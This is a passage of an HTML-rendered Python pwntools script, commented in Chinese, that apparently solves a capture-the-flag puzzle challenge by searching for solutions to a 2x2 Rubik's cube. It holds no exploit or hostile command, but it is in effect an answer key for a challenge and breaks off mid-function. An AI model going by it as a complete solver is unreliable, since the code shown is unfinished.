class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 1. 极速魔方引擎 (基于预计算的索引映射)</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动作定义</span></span><br><span class="line">MOVES_STR = [<span class="string">&quot;U&quot;</span>, <span class="string">&quot;U&#x27;&quot;</span>, <span class="string">&quot;U2&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;D&#x27;&quot;</span>, <span class="string">&quot;D2&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;F&#x27;&quot;</span>, <span class="string">&quot;F2&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;B&#x27;&quot;</span>, <span class="string">&quot;B2&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;L&#x27;&quot;</span>, <span class="string">&quot;L2&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;R&#x27;&quot;</span>, <span class="string">&quot;R2&quot;</span>]</span><br><span class="line"><span class="comment"># 预计算的置换表：TRANSITION_TABLES[move_idx] = (new_idx_0, new_idx_1, ... new_idx_23)</span></span><br><span class="line">TRANSITION_TABLES = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_transition_tables</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用题目原本的逻辑生成 18 种移动的索引置换表。</span></span><br><span class="line"><span class="string">    这确保了我们的移动逻辑与服务器完全一致，但速度快百倍。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">TempCube</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="comment"># 将每个格子初始化为它的索引值 0-23</span></span><br><span class="line">            <span class="comment"># 顺序: U(0-3), D(4-7), F(8-11), B(12-15), L(16-19), R(20-23)</span></span><br><span class="line">            <span class="variable language_">self</span>.f = [[<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">4</span> * i, <span class="number">4</span> * i + <span class="number">4</span>)[x:x + <span class="number">2</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">            <span class="variable language_">self</span>.<span class="built_in">map</span> = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="string">&quot;UDFBLR&quot;</span>, <span class="built_in">range</span>(<span class="number">6</span>))&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">rot</span>(<span class="params">self, face, cw=<span class="literal">True</span></span>):</span><br><span class="line">            f_idx = <span class="variable language_">self</span>.<span class="built_in">map</span>[face]</span><br><span class="line">            old = <span class="variable language_">self</span>.f[f_idx]</span><br><span class="line">            <span class="keyword">if</span> cw:</span><br><span class="line">                <span class="variable language_">self</span>.f[f_idx] = [[old[<span class="number">1</span>][<span class="number">0</span>], old[<span class="number">0</span>][<span class="number">0</span>]], [old[<span class="number">1</span>][<span class="number">1</span>], old[<span class="number">0</span>][<span class="number">1</span>]]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.f[f_idx] = [[old[<span class="number">0</span>][<span class="number">1</span>], old[<span class="number">1</span>][<span class="number">1</span>]], [old[<span class="number">0</span>][<span class="number">0</span>], old[<span class="number">1</span>][<span class="number">0</span>]]]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">self, m</span>):</span><br><span class="line">            base, prime = m[<span class="number">0</span>], <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> m</span><br><span class="line">            <span class="variable language_">self</span>.rot(base, <span class="keyword">not</span> prime)  <span class="comment"># 旋转面本身</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 辅助函数</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">g_row</span>(<span class="params">Face, r</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">self</span>.f[<span class="variable language_">self</span>.<span class="built_in">map</span>[Face]][r][:]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">s_row</span>(<span class="params">Face, r, v</span>):</span><br><span class="line">                <span class="variable language_">self</span>.f[<span class="variable language_">self</span>.<span class="built_in">map</span>[Face]][r] = v</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">g_col</span>(<span class="params">Face, c</span>):</span><br><span class="line">                <span class="keyword">return</span> [<span class="variable language_">self</span>.f[<span class="variable language_">self</span>.<span class="built_in">map</span>[Face]][r][c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">s_col</span>(<span class="params">Face, c, v</span>):</span><br><span class="line">                <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>): <span class="variable language_">self</span>.f[<span class="variable language_">self</span>.<span class="built_in">map</span>[Face]][r][c] = v[r]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 侧面联动逻辑 (Copy from challenge source)</span></span><br><span class="line">            <span class="keyword">if</span> base == <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">                F, R, B, L = g_row(<span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>), g_row(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>), g_row(<span class="string">&#x27;B&#x27;</span>, <span class="number">0</span>), g_row(<span class="string">&#x27;L&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">if</span> prime:</span><br><span class="line">                    s_row(<span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>, L); s_row(<span class="string">&#x27;L&#x27;</span>, <span class="number">0</span>, B); s_row(<span class="string">&#x27;B&#x27;</span>, <span class="number">0</span>, R); s_row(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>, F)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s_row(<span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>, R); s_row(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>, B); s_row(<span class="string">&#x27;B&#x27;</span>, <span class="number">0</span>, L); s_row(<span class="string">&#x27;L&#x27;</span>, <span class="number">0</span>, F)</span><br><span class="line">            <span class="keyword">elif</span> base == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                F, R, B, L = g_row(<span class="string">&#x27;F&#x27;</span>, <span class="number">1</span>), g_row(<span class="string">&#x27;R&#x27;</span>, <span class="number">1</span>), g_row(<span class="string">&#x27;B&#x27;</span>, <span class="number">1</span>), g_row(<span class="string">&#x27;L&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> prime:</span><br><span class="line">                    s_row(<span class="string">&#x27;F&#x27;</span>, <span class="number">1</span>, R); s_row(<span class="string">&#x27;R&#x27;</span>, <span class="number">1</span>, B); s_row(<span class="string">&#x27;B&#x27;</span>, <span class="number">1</span>, L); s_row(<span class="string">&#x27;L&#x27;</span>, <span class="number">1</span>, F)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s_row(<span class="string">&#x27;F&#x27;</span>, <span class="number">1</span>, L); s_row(<span class="string">&#x27;L&#x27;</span>, <span class="number">1</span>, B); s_row(<span class="string">&#x27;B&#x27;</span>, <span class="number">1</span>, R); s_row(<span class="string">&#x27;R&#x27;</span>, <span class="number">1</span>, F)</span><br><span class="line">            <span class="keyword">elif</span> base == <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                U1, R0, D0, L1 = g_row(<span class="string">&#x27;U&#x27;</span>, <span class="number">1</span>), g_col(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>), g_row(<span class="string">&#x27;D&#x27;</span>, <span class="number">0</span>), g_col(<span class="string">&#x27;L&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> prime:</span><br><span class="line">                    s_row(<span class="string">&#x27;U&#x27;</span>, <span class="number">1</span>, R0);</span><br><span class="line">                    s_col(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>, D0[::-<span class="number">1</span>]);</span><br><span class="line">                    s_row(<span class="string">&#x27;D&#x27;</span>, <span class="number">0</span>, L1);</span><br><span class="line">                    s_col(<span class="string">&#x27;L&#x27;</span>, <span class="number">1</span>, U1[::-<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s_row(<span class="string">&#x27;U&#x27;</span>, <span class="number">1</span>, L1[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;L&#x27;</span>, <span class="number">1</span>, D0);</span><br><span class="line">                    s_row(<span class="string">&#x27;D&#x27;</span>, <span class="number">0</span>, R0[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>, U1)</span><br><span class="line">            <span class="keyword">elif</span> base == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                U0, L0, D1, R1 = g_row(<span class="string">&#x27;U&#x27;</span>, <span class="number">0</span>), g_col(<span class="string">&#x27;L&#x27;</span>, <span class="number">0</span>), g_row(<span class="string">&#x27;D&#x27;</span>, <span class="number">1</span>), g_col(<span class="string">&#x27;R&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> prime:</span><br><span class="line">                    s_row(<span class="string">&#x27;U&#x27;</span>, <span class="number">0</span>, L0[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;L&#x27;</span>, <span class="number">0</span>, D1);</span><br><span class="line">                    s_row(<span class="string">&#x27;D&#x27;</span>, <span class="number">1</span>, R1[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;R&#x27;</span>, <span class="number">1</span>, U0)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s_row(<span class="string">&#x27;U&#x27;</span>, <span class="number">0</span>, R1);</span><br><span class="line">                    s_col(<span class="string">&#x27;R&#x27;</span>, <span class="number">1</span>, D1[::-<span class="number">1</span>]);</span><br><span class="line">                    s_row(<span class="string">&#x27;D&#x27;</span>, <span class="number">1</span>, L0);</span><br><span class="line">                    s_col(<span class="string">&#x27;L&#x27;</span>, <span class="number">0</span>, U0[::-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">elif</span> base == <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">                U0, F0, D0, B1 = g_col(<span class="string">&#x27;U&#x27;</span>, <span class="number">0</span>), g_col(<span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>), g_col(<span class="string">&#x27;D&#x27;</span>, <span class="number">0</span>), g_col(<span class="string">&#x27;B&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> prime:</span><br><span class="line">                    s_col(<span class="string">&#x27;U&#x27;</span>, <span class="number">0</span>, F0);</span><br><span class="line">                    s_col(<span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>, D0);</span><br><span class="line">                    s_col(<span class="string">&#x27;D&#x27;</span>, <span class="number">0</span>, B1[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;B&#x27;</span>, <span class="number">1</span>, U0[::-<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s_col(<span class="string">&#x27;U&#x27;</span>, <span class="number">0</span>, B1[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;B&#x27;</span>, <span class="number">1</span>, D0[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;D&#x27;</span>, <span class="number">0</span>, F0);</span><br><span class="line">                    s_col(<span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>, U0)</span><br><span class="line">            <span class="keyword">elif</span> base == <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">                U1, B0, D1, F1 = g_col(<span class="string">&#x27;U&#x27;</span>, <span class="number">1</span>), g_col(<span class="string">&#x27;B&#x27;</span>, <span class="number">0</span>), g_col(<span class="string">&#x27;D&#x27;</span>, <span class="number">1</span>), g_col(<span class="string">&#x27;F&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> prime:</span><br><span class="line">                    s_col(<span class="string">&#x27;U&#x27;</span>, <span class="number">1</span>, B0[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;B&#x27;</span>, <span class="number">0</span>, D1[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;D&#x27;</span>, <span class="number">1</span>, F1);</span><br><span class="line">                    s_col(<span class="string">&#x27;F&#x27;</span>, <span class="number">1</span>, U1)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s_col(<span class="string">&#x27;U&#x27;</span>, <span class="number">1</span>, F1);</span><br><span class="line">                    s_col(<span class="string">&#x27;F&#x27;</span>, <span class="number">1</span>, D1);</span><br><span class="line">                    s_col(<span class="string">&#x27;D&#x27;</span>, <span class="number">1</span>, B0[::-<span class="number">1</span>]);</span><br><span class="line">                    s_col(<span class="string">&#x27;B&#x27;</span>, <span class="number">0</span>, U1[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_flat</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> [x <span class="keyword">for</span> face <span class="keyword">in</span> <span class="variable language_">self</span>.f <span class="keyword">for</span> row <span class="keyword">in</span> face <span class="keyword">for</span> x <span class="keyword">in</span> row]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成表</span></span><br><span class="line">    <span class="keyword">global</span> TRANSITION_TABLES</span><br><span class="line">    TRANSITION_TABLES = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> MOVES_STR:</span><br><span class="line">        c = TempCube()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;2&quot;</span> <span class="keyword">in</span> m:</span><br><span class="line">            base = m.replace(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            c.move(base);</span><br><span class="line">            c.move(base)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c.move(m)</span><br><span class="line">        TRANSITION_TABLES.append(<span class="built_in">tuple</span>(c.get_flat()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化映射表</span></span><br><span class="line">generate_transition_tables()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 2. 算法核心：中间相遇 (Precompute + BFS)</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"></span><br><span class="line">VISITED = &#123;&#125;  <span class="comment"># &#123; state_tuple : (parent_state, move_from_parent_index) &#125;</span></span><br><span class="line">SOLVED_STATE = <span class="built_in">tuple</span>(c <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>) <span class="keyword">for</span> c <span class="keyword">in</span> [i] * <span class="number">4</span>)  <span class="comment"># 0000 1111 ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 剪枝规则：ALLOWED_MOVES[last_face_index]</span></span><br><span class="line"><span class="comment"># 0:U, 1:D, 2:F, 3:B, 4:L, 5:R</span></span><br><span class="line">ALLOWED_MOVES = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line"><span class="keyword">for</span> last_f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> m_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        curr_f = m_idx // <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> curr_f == last_f: <span class="keyword">continue</span>  <span class="comment"># 禁止同面连续</span></span><br><span class="line">        <span class="comment"># 禁止对立面逆序 (如禁止 D 后 U，强制 U 后 D)，避免重复状态</span></span><br><span class="line">        <span class="keyword">if</span> last_f <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>] <span class="keyword">and</span> curr_f == last_f - <span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">        ALLOWED_MOVES[last_f].append(m_idx)</span><br><span class="line">ALLOWED_MOVES[<span class="number">6</span>] = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">18</span>))  <span class="comment"># 初始状态允许所有移动</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precompute</span>(<span class="params">depth=<span class="number">7</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;预计算：从复原状态反向生成 depth 步内的所有状态&quot;&quot;&quot;</span></span><br><span class="line">    log.info(<span class="string">f&quot;正在进行预计算 (深度 <span class="subst">&#123;depth&#125;</span>)... 请耐心等待约 30-50 秒...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    q = collections.deque([(SOLVED_STATE, <span class="number">6</span>, <span class="number">0</span>)])</span><br><span class="line">    VISITED[SOLVED_STATE] = (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    t_start = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> q:</span><br><span class="line">        curr, last_f, d = q.popleft()</span><br><span class="line">        <span class="keyword">if</span> d &gt;= depth: <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> m_idx <span class="keyword">in</span> ALLOWED_MOVES[last_f]:</span><br><span class="line">            <span class="comment"># 极速状态转移</span></span><br><span class="line">            table = TRANSITION_TABLES[m_idx]</span><br><span class="line">            nxt = <span class="built_in">tuple</span>(curr[i] <span class="keyword">for</span> i <span class="keyword">in</span> table)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> nxt <span class="keyword">not</span> <span class="keyword">in</span> VISITED:</span><br><span class="line">                VISITED[nxt] = (curr, m_idx)  <span class="comment"># 记录路径</span></span><br><span class="line">                q.append((nxt, m_idx // <span class="number">3</span>, d + <span class="number">1</span>))</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> cnt % <span class="number">500000</span> == <span class="number">0</span>:</span><br><span class="line">                    sys.stdout.write(<span class="string">f&quot;\r[*] 已生成 <span class="subst">&#123;cnt&#125;</span> 个状态 (<span class="subst">&#123;time.time() - t_start:<span class="number">.1</span>f&#125;</span>s)&quot;</span>)</span><br><span class="line">                    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    log.success(<span class="string">f&quot;预计算完成! 总状态数: <span class="subst">&#123;<span class="built_in">len</span>(VISITED)&#125;</span>. 耗时: <span class="subst">&#123;time.time() - t_start:<span class="number">.1</span>f&#125;</span>s&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从预计算表回溯解法&quot;&quot;&quot;</span></span><br><span class="line">    path = []</span><br><span class="line">    curr = state</span><br><span class="line">    <span class="keyword">while</span> curr != SOLVED_STATE:</span><br><span class="line">        parent, m_idx = VISITED[curr]</span><br><span class="line">        <span class="comment"># 反向逻辑：存的是 parent-&gt;curr，解法需要逆向操作</span></span><br><span class="line">        m_str = MOVES_STR[m_idx]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;2&quot;</span> <span class="keyword">in</span> m_str:</span><br><span class="line">            inv = m_str</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> m_str:</span><br><span class="line">            inv = m_str.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inv = m_str + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        path.append(inv)</span><br><span class="line">        curr = parent</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 角块合法性索引 (用于过滤隐藏面的猜测)</span></span><br><span class="line">CORNERS_CHECK = [</span><br><span class="line">    (<span class="number">2</span>, <span class="number">8</span>, <span class="number">17</span>), (<span class="number">3</span>, <span class="number">9</span>, <span class="number">20</span>), (<span class="number">0</span>, <span class="number">13</span>, <span class="number">16</span>), (<span class="number">1</span>, <span class="number">12</span>, <span class="number">21</span>),</span><br><span class="line">    (<span class="number">4</span>, <span class="number">10</span>, <span class="number">19</span>), (<span class="number">5</span>, <span class="number">11</span>, <span class="number">22</span>), (<span class="number">6</span>, <span class="number">15</span>, <span class="number">18</span>), (<span class="number">7</span>, <span class="number">14</span>, <span class="number">23</span>)</span><br><span class="line">]</span><br><span class="line">OPP_PAIRS = [&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>&#125;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_cube</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">for</span> idxs <span class="keyword">in</span> CORNERS_CHECK:</span><br><span class="line">        c = &#123;state[i] <span class="keyword">for</span> i <span class="keyword">in</span> idxs&#125;</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> OPP_PAIRS:</span><br><span class="line">            <span class="keyword">if</span> p.issubset(c): <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 角块包含对立色，非法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 3. 交互与主逻辑</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_round</span>(<span class="params">io</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 读取题目数据</span></span><br><span class="line">        raw = io.recvuntil(<span class="string">b&quot;[?] Enter your solution&quot;</span>, timeout=<span class="number">2</span>).decode()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析 Face U: ... 等数据</span></span><br><span class="line">    lines = raw.splitlines()</span><br><span class="line">    face_map = &#123;&#125;</span><br><span class="line">    curr_f = <span class="literal">None</span></span><br><span class="line">    color_map = &#123;<span class="string">&quot;U&quot;</span>: <span class="number">0</span>, <span class="string">&quot;D&quot;</span>: <span class="number">1</span>, <span class="string">&quot;F&quot;</span>: <span class="number">2</span>, <span class="string">&quot;B&quot;</span>: <span class="number">3</span>, <span class="string">&quot;L&quot;</span>: <span class="number">4</span>, <span class="string">&quot;R&quot;</span>: <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Face&quot;</span> <span class="keyword">in</span> l:</span><br><span class="line">            curr_f = color_map[l.split()[<span class="number">1</span>].strip(<span class="string">&quot;:&quot;</span>)]</span><br><span class="line">            face_map[curr_f] = []</span><br><span class="line">        <span class="keyword">elif</span> l.strip().startswith(<span class="string">&quot;|&quot;</span>):</span><br><span class="line">            row = l.strip(<span class="string">&quot;| &quot;</span>).split()</span><br><span class="line">            face_map[curr_f].extend([color_map[x] <span class="keyword">for</span> x <span class="keyword">in</span> row])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重构魔方状态</span></span><br><span class="line">    state_builder = []</span><br><span class="line">    visible = face_map.keys()</span><br><span class="line">    hidden = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>) <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> visible][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 统计缺失颜色</span></span><br><span class="line">    counts = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> visible:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> face_map[f]: counts[c] += <span class="number">1</span></span><br><span class="line">    missing = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        missing.extend([c] * (<span class="number">4</span> - counts[c]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> f == hidden:</span><br><span class="line">            state_builder.extend([<span class="literal">None</span>] * <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            state_builder.extend(face_map[f])</span><br><span class="line"></span><br><span class="line">    unknown_idxs = [i <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(state_builder) <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 